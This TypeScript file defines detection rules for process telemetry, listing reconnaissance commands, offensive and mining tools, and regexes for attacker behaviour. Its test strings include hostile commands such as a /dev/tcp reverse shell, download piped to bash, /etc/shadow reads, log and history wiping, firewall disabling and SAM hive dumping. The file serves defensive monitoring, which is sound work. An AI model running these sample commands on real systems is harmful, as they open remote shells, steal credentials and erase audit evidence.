// Match process telemetry, never free-text mentions in application messages.
import { executableName, executionContexts } from './securityCommandParsing.ts'

export type SecurityRule = { id: string, name: string, family: string, severity: 'low' | 'medium' | 'high' | 'critical', explanation: string, pattern: string, field: 'executable' | 'command', positive: string, negative: string }
type ReconnaissanceRuleEntry = [tool: string, severity: SecurityRule['severity'], explanation?: string]

const escapeRegex = (value: string): string => value.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')

const reconnaissanceRule = ([tool, severity, explanation]: ReconnaissanceRuleEntry): SecurityRule => ({
    id: `process.recon.${tool}.v1`,
    name: `${tool} reconnaissance`,
    family: 'Reconnaissance',
    severity,
    explanation: explanation ?? `The ${tool} command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.`,
    pattern: String.raw`(?:^|[/\\])${escapeRegex(tool)}(?:\.exe)?$`,
    field: 'executable',
    positive: `/usr/bin/${tool}`,
    negative: '/usr/bin/echo'
})

type SecurityToolRuleEntry = readonly [id: string, executable: string]

const securityToolRule = ([id, executable]: SecurityToolRuleEntry): SecurityRule => ({
    id: `process.tool.${id}.v1`,
    name: `${executable} execution`,
    family: 'Security tooling',
    severity: 'critical',
    explanation: `Execution of ${executable} requires review for authorized security testing or malicious activity.`,
    pattern: String.raw`(?:^|[/\\])${escapeRegex(executable)}(?:\.py|\.exe)?$`,
    field: 'executable',
    positive: `/opt/${executable}`,
    negative: '/usr/bin/echo'
})

const securityToolRules: SecurityToolRuleEntry[] = [
    ['xmrig', 'xmrig'],
    ['xmr_stak', 'xmr-stak'],
    ['minerd', 'minerd'],
    ['cpuminer', 'cpuminer'],
    ['kinsing', 'kinsing'],
    ['kdevtmpfsi', 'kdevtmpfsi'],
    ['masscan', 'masscan'],
    ['nmap', 'nmap'],
    ['rustscan', 'rustscan'],
    ['zmap', 'zmap'],
    ['nikto', 'nikto'],
    ['sqlmap', 'sqlmap'],
    ['hydra', 'hydra'],
    ['medusa', 'medusa'],
    ['john', 'john'],
    ['hashcat', 'hashcat'],
    ['mimikatz', 'mimikatz'],
    ['secretsdump', 'secretsdump'],
    ['pypykatz', 'pypykatz'],
    ['bloodhound', 'bloodhound'],
    ['sharphound', 'sharpHound'],
    ['bloodhound_python', 'bloodhound-python'],
    ['crackmapexec', 'crackmapexec'],
    ['netexec', 'netexec'],
    ['evil_winrm', 'evil-winrm'],
    ['responder', 'responder'],
    ['ntlmrelayx', 'ntlmrelayx'],
    ['mitm6', 'mitm6'],
    ['kerbrute', 'kerbrute'],
    ['rubeus', 'rubeus'],
    ['certipy', 'certipy'],
    ['certutil', 'certutil'],
    ['chisel', 'chisel'],
    ['ligolo_ng', 'ligolo-ng'],
    ['frpc', 'frpc'],
    ['ngrok', 'ngrok'],
    ['socat', 'socat'],
    ['msfconsole', 'msfconsole'],
    ['msfvenom', 'msfvenom'],
    ['sliver_client', 'sliver-client'],
    ['cobaltstrike', 'cobaltstrike'],
    ['linpeas', 'linpeas'],
    ['winpeas', 'winpeas'],
    ['linux_exploit_suggester', 'linux-exploit-suggester'],
    ['enum4linux', 'enum4linux'],
    ['smbclient', 'smbclient'],
    ['rpcclient', 'rpcclient'],
    ['impacket_psexec', 'impacket-psexec'],
    ['impacket_wmiexec', 'impacket-wmiexec'],
]

const reconnaissanceRules: ReconnaissanceRuleEntry[] = [
    ['whoami', 'high'],
    ['id', 'low'],
    ['hostname', 'high'],
    ['uname', 'low'],
    ['uptime', 'high'],
    ['w', 'high'],
    ['who', 'high'],
    ['last', 'high'],
    ['lastlog', 'high'],
    ['groups', 'high'],
    ['getent', 'high'],
    ['env', 'high', 'The env command listed environment variables without launching another program. Review the user and surrounding activity; legitimate administration can also trigger this rule.'],
    ['printenv', 'high'],
    ['ps', 'low'],
    ['pstree', 'high'],
    ['top', 'high'],
    ['ss', 'high'],
    ['netstat', 'high'],
    ['lsof', 'high'],
    ['ip', 'high'],
    ['ifconfig', 'high'],
    ['route', 'high'],
    ['arp', 'high'],
    ['nslookup', 'high'],
    ['dig', 'high'],
    ['host', 'low'],
    ['traceroute', 'high'],
    ['tracepath', 'high'],
    ['systeminfo', 'high'],
    ['tasklist', 'high'],
    ['quser', 'high'],
    ['qwinsta', 'high'],
    ['nltest', 'high'],
    ['dsquery', 'high'],
    ['net', 'high'],
]

export const securityRules: SecurityRule[] = [
    ...reconnaissanceRules.map(reconnaissanceRule),
    ...securityToolRules.map(securityToolRule),
    {
        'id': 'process.behavior.tool_download.v1',
        'name': 'Security tool download',
        'family': 'Command behavior',
        'severity': 'critical',
        'explanation': 'Security tool download observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '\\b(?:curl|wget|invoke-webrequest|iwr)\\b.*\\b(?:bloodhound|sharphound|xmrig|mimikatz|linpeas|winpeas|chisel|ligolo|rubeus|secretsdump)\\b',
        'field': 'command',
        'positive': 'curl https://example.test/BloodHound.zip',
        'negative': 'curl https://example.test/health'
    },
    {
        'id': 'process.behavior.pipe_shell.v1',
        'name': 'Download piped to shell',
        'family': 'Command behavior',
        'severity': 'critical',
        'explanation': 'Download piped to shell observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '\\b(?:curl|wget)\\b[^\\n]*\\|\\s*(?:sudo\\s+)?(?:sh|bash|zsh)\\b',
        'field': 'command',
        'positive': 'curl https://example.test/install | bash',
        'negative': 'curl https://example.test/health'
    },
    {
        'id': 'process.behavior.reverse_shell.v1',
        'name': 'Shell network redirection',
        'family': 'Command behavior',
        'severity': 'critical',
        'explanation': 'Shell network redirection observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '(?:/dev/tcp/|\\b(?:nc|ncat|netcat)\\b.*\\s-[^\\s]*e\\s|socket\\.socket\\(.*(?:dup2|subprocess))',
        'field': 'command',
        'positive': 'bash -i > /dev/tcp/192.0.2.1/4444',
        'negative': 'cat /etc/hosts'
    },
    {
        'id': 'process.behavior.shadow_read.v1',
        'name': 'Password hash file access',
        'family': 'Command behavior',
        'severity': 'critical',
        'explanation': 'Password hash file access observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '\\b(?:cat|head|tail|cp|scp|tar)\\b.*(?:/etc/(?:shadow|gshadow)|/SAM\\b|/NTDS\\.dit\\b)',
        'field': 'command',
        'positive': 'cat /etc/shadow',
        'negative': 'cat /etc/os-release'
    },
    {
        'id': 'process.behavior.history_clear.v1',
        'name': 'Shell history removal',
        'family': 'Command behavior',
        'severity': 'high',
        'explanation': 'Shell history removal observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '(?:\\bhistory\\s+-c\\b|\\b(?:rm|truncate)\\b.*(?:bash_history|zsh_history)|HISTFILE\\s*=\\s*/dev/null)',
        'field': 'command',
        'positive': 'history -c',
        'negative': 'history'
    },
    {
        'id': 'process.behavior.logs_clear.v1',
        'name': 'Audit or system log removal',
        'family': 'Command behavior',
        'severity': 'critical',
        'explanation': 'Audit or system log removal observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '\\b(?:rm|truncate|shred)\\b.*(?:/var/log/|audit\\.log)',
        'field': 'command',
        'positive': 'truncate -s 0 /var/log/auth.log',
        'negative': 'tail /var/log/auth.log'
    },
    {
        'id': 'process.behavior.audit_disable.v1',
        'name': 'Audit collection disabled',
        'family': 'Command behavior',
        'severity': 'critical',
        'explanation': 'Audit collection disabled observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '(?:\\bauditctl\\s+-(?:e\\s+0|D)\\b|\\b(?:systemctl|service)\\s+(?:stop|disable)\\s+(?:auditd|rsyslog)\\b)',
        'field': 'command',
        'positive': 'auditctl -e 0',
        'negative': 'auditctl -s'
    },
    {
        'id': 'process.behavior.firewall_disable.v1',
        'name': 'Firewall disabled',
        'family': 'Command behavior',
        'severity': 'critical',
        'explanation': 'Firewall disabled observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '(?:\\bufw\\s+disable\\b|\\biptables\\s+-F\\b|\\bnft\\s+flush\\s+ruleset\\b)',
        'field': 'command',
        'positive': 'ufw disable',
        'negative': 'ufw status'
    },
    {
        'id': 'process.behavior.suid_set.v1',
        'name': 'Set-user-ID permission change',
        'family': 'Command behavior',
        'severity': 'high',
        'explanation': 'Set-user-ID permission change observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '\\bchmod\\b.*(?:\\bu\\+s\\b|\\b[2467][0-7]{3}\\b)',
        'field': 'command',
        'positive': 'chmod 4755 /tmp/tool',
        'negative': 'chmod 644 /tmp/readme'
    },
    {
        'id': 'process.behavior.authorized_keys.v1',
        'name': 'SSH authorized key modification',
        'family': 'Command behavior',
        'severity': 'high',
        'explanation': 'SSH authorized key modification observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '(?:\\b(?:tee|cp|mv|sed)\\b.*authorized_keys|>>?\\s*[^\\s]*authorized_keys)',
        'field': 'command',
        'positive': 'tee /root/.ssh/authorized_keys',
        'negative': 'cat /root/.ssh/authorized_keys'
    },
    {
        'id': 'process.behavior.cron_write.v1',
        'name': 'Scheduled command modification',
        'family': 'Command behavior',
        'severity': 'high',
        'explanation': 'Scheduled command modification observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '(?:\\bcrontab\\s+-(?:e|r)\\b|\\b(?:tee|cp|mv)\\b.*(?:/etc/cron|/var/spool/cron))',
        'field': 'command',
        'positive': 'crontab -e',
        'negative': 'crontab -l'
    },
    {
        'id': 'process.behavior.base64_exec.v1',
        'name': 'Encoded command execution',
        'family': 'Command behavior',
        'severity': 'critical',
        'explanation': 'Encoded command execution observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '(?:\\bpowershell\\b.*\\s-(?:enc|encodedcommand)\\b|\\bbase64\\s+(?:-d|--decode)\\b.*\\|\\s*(?:bash|sh)\\b)',
        'field': 'command',
        'positive': 'powershell -EncodedCommand AAAA',
        'negative': 'base64 report.txt'
    },
    {
        'id': 'process.behavior.credential_dump.v1',
        'name': 'Windows credential dump',
        'family': 'Command behavior',
        'severity': 'critical',
        'explanation': 'Windows credential dump observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '(?:\\breg\\s+save\\s+hklm\\\\(?:sam|security|system)\\b|\\bcomsvcs\\.dll\\b.*\\bMiniDump\\b)',
        'field': 'command',
        'positive': 'reg save HKLM\\SAM C:\\dump',
        'negative': 'reg query HKLM\\Software'
    },
    {
        'id': 'process.behavior.docker_socket.v1',
        'name': 'Container host control socket access',
        'family': 'Command behavior',
        'severity': 'high',
        'explanation': 'Container host control socket access observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '\\b(?:curl|docker)\\b.*(?:docker\\.sock|--privileged\\b)',
        'field': 'command',
        'positive': 'docker run --privileged alpine',
        'negative': 'docker ps'
    }
]

const expressions = new Map(securityRules.map(rule => [rule.id, new RegExp(rule.pattern, 'i')]))
const behaviorPrograms: Record<string, RegExp> = {
    tool_download: /^(curl|wget|invoke-webrequest|iwr)$/,
    pipe_shell: /^(curl|wget)$/,
    reverse_shell: /^(?:ba|z|k)?sh$|^(?:nc|ncat|netcat|python[\d.]*|perl|ruby|php)$/,
    shadow_read: /^(cat|head|tail|cp|scp|tar)$/,
    history_clear: /^(history|rm|truncate|histfile=)/,
    logs_clear: /^(rm|truncate|shred)$/,
    audit_disable: /^(auditctl|systemctl|service)$/,
    firewall_disable: /^(ufw|iptables|nft)$/,
    suid_set: /^chmod$/,
    authorized_keys: /^(tee|cp|mv|sed|echo|printf)$/,
    cron_write: /^(crontab|tee|cp|mv)$/,
    base64_exec: /^(powershell|pwsh|base64)$/,
    credential_dump: /^(reg|rundll32)$/,
    docker_socket: /^(curl|docker)$/,
}

export function matchSecurityRules(event: Record<string, unknown>) {
    const process = event.process && typeof event.process === 'object' ? event.process as Record<string, unknown> : {}
    if (event.event_type !== 'process' || event.action !== 'exec') return []
    const command = typeof process.command_line === 'string' ? process.command_line.slice(0, 65536) : ''
    const executable = typeof process.executable === 'string' ? process.executable : ''
    const context = executionContexts(executable, command, process.arguments)
    return securityRules.filter(rule => {
        const expression = expressions.get(rule.id)!
        if (rule.field === 'executable') return [...context.executables].some(path => expression.test(path.replace(/\.sh$/i, '')))
        const behavior = rule.id.split('.')[2]
        return context.commands.some((entry, index) => {
            const name = executableName(entry.args[0])
            if (!behaviorPrograms[behavior]?.test(name)) return false
            if (behavior === 'pipe_shell') return entry.next === '|' && /^(?:sudo\s+)?(?:ba|z)?sh\b/.test(context.commands[index + 1]?.args.join(' ') || '')
            if (behavior === 'authorized_keys' && ['echo', 'printf'].includes(name)) {
                const unquoted = entry.text.replace(/"(?:\\.|[^"\\])*"|'[^']*'/g, '')
                return />>?\s*[^\s]*authorized_keys/.test(unquoted)
            }
            // Preserve pipeline evidence for base64 decode followed by a shell.
            const text = entry.next === '|' ? `${entry.text} | ${context.commands[index + 1]?.text || ''}` : entry.text
            return expression.test(text)
        })
    })
}
